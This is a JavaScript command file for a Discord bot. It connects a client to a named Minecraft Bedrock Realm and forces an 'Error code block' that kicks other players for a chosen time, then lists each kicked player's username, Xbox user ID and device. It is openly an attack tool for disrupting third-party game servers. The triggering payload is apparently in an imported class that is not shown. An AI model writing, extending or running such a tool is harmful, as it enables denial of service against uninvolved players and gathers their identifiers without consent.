const Command = require("../_/Command.js");

const RealmApi = require('../../Classes/Realm.js')
const Client = require('../../Classes/Client.js')

class ErrorBlock extends Command {
    subCommand = "error";
    linkOnly = true;

    constructor() {
        super("block", "Allows you to force \"Error code block\" to happen on a realm.", [
            ...require('../../Data/InputBlock.json'),
            {
                name: "type",
                description: "The type to use, all produce same output.",
                type: 4,
                required: true,
                choices: [
                    { name: "T1 [c]", value: 1 },
                    { name: "T2 [c]", value: 2 },
                    { name: "T3 [c]", value: 3 },
                    { name: "T4 [c]", value: 4 }
                ]
            },
            {
                type: 4,
                name: "time",
                description: "Time in seconds to perform action for!",
                required: true,
                min_value: 15,
                max_value: 400
            }
        ]);
    }

    /**
     * @param {import("discord.js").CommandInteraction} interaction
     * @param {{ components: import("../../Classes/DiscordJS/Component.js") }} helpers
     */
    async execute(interaction, { components, args }) {
        const { input, type, time } = args;
        Object.assign(this, { interaction, components });

        await interaction.deferReply({ flags: this.flags });

        if (this.maps.inGame.has(interaction.user.id))
            return this.fastReply("Already in game.", "You are already doing a in-game command, please wait for it to finish before doing another one.");
        this.maps.inGame.set(interaction.user.id, { type: "errorBlock", input, stage: "testingRealm", client: null });

        try {
            const realmApi = new RealmApi(interaction.dbUser);
            await realmApi.init();

            let realm = /^\d+$/.test(input)
                ? await realmApi.getRealmInfoByID(input, true)
                : await realmApi.getRealmInfo(input, false, true);

            if (realm?.errorMsg) return this.invalidApiResponse(realm, input);

            let host = await realmApi.getRealmIP(realm?.id, true);
            if (host?.errorMsg) return this.invalidApiResponse(host, input);
            realm.address = host.address;

            const client = new Client(realmApi, realm, interaction.dbUser, { ssbp: { enabled: true, type }, noRCR: true });
            if (this.maps.inGame.get(interaction.user.id).disconnect)
                client.destroyClient('User requested close before client connection.', 'fastClose');

            this.maps.inGame.get(interaction.user.id).client = client;

            client.timeouts.push(setTimeout(() => {
                client.destroyClient("Client timeout, Client -> Server closed.", "connectionVoided")
                this.maps.inGame.delete(interaction.user.id)
            },
                5 * 60000));

            let usersDisconnected = new Set();

            client.on('join', async () => {
                components
                    .reset()
                    .separator()
                    .text(
                        `### Error Blocking Realm.\n` +
                        `-# perxa has connected to **${realm.name}** *(${realm.id})*, and is attempting to perform a T${type} Error-Block, please note that **[nyx](https://discord.com/channels/1539384072848150609/1554971578788221050)** ` +
                        `and other clients may block the disconnect by removing the skinData causing the error-block, on top of that private proxy's may also block it.\n\n` +
                        `-# ***disconnecting <t:${Math.floor(Date.now() / 1000) + time}:R>!***`
                    )
                    .separator();

                await interaction.editReply({ components, flags: this.flags });

                client.timeouts.push(setTimeout(() => {
                    client.destroyClient("Client time reached, perxa closed connection.", "defaultClose", false)

                    return this.fastReply("Disconnected",
                        `-# ***Client has disconnected from the realm!***\n\n` +
                        (usersDisconnected.size > 0 ?
                            Array.from(usersDisconnected)
                                .map(user => `-# *${user.didGetRemoved ? 'removed' : 'not removed'}* **${user.username}** - \`${user.xuid}\` (${user.device.name})`)
                                .join('\n') :
                            `-# No one removed`
                        ),
                        true
                    );
                }, time * 1000))
            });

            client.on('player_list', (packet) => {
                for (const record of packet.records) {
                    const uuid = record?.uuid;

                    switch (record.type) {
                        case 'add':
                            const { username, xbox_user_id, build_platform, is_subclient } = record;

                            if (xbox_user_id === client.tokenData?.xid) continue; //just no
                            if (is_subclient || [5, 10, 14].includes(Number(build_platform))) continue;

                            const device = Devices[build_platform] ?? { name: "Unknown", family: "Unknown" };
                            if (!usersDisconnected.has(uuid)) usersDisconnected.add({ uuid, username, device, xuid: xbox_user_id, didGetRemoved: false, removed: 0 });
                            break;
                        case 'remove':
                            usersDisconnected.forEach(user => {
                                if (user.uuid === uuid) {
                                    user.didGetRemoved = true;
                                    user.removed++
                                }
                            });
                            break;
                    }
                }
            });

            client.once('clientClosed', async ({ reason }) => this.closedComponent(realm, reason, client));
        } catch (error) {
            console.error(error);
        }
    }
}

module.exports = ErrorBlock;

const Devices = {
    Undefined: { name: "Undefined", family: "Unknown" },
    Android: { name: "Android", family: "Mobile" },
    IOS: { name: "iOS", family: "Mobile" },
    OSX: { name: "OSX", family: "Desktop" },
    FireOS: { name: "FireOS", family: "Mobile" },
    GearVR: { name: "GearVR", family: "VR" },
    Hololens: { name: "Hololens", family: "VR" },
    Win10: { name: "Windows", family: "Desktop" },
    Win32: { name: "Windows", family: "Desktop" },
    Dedicated: { name: "Dedicated", family: "Dedicated" },
    TVOS: { name: "TvOS", family: "TV" },
    Orbis: { name: "Playstation", family: "Console" },
    NintendoSwitch: { name: "NintendoSwitch", family: "Console" },
    Xbox: { name: "Xbox", family: "Console" },
    WindowsPhone: { name: "WindowsPhone", family: "Mobile" },
    Linux: { name: "Linux", family: "Desktop" }
};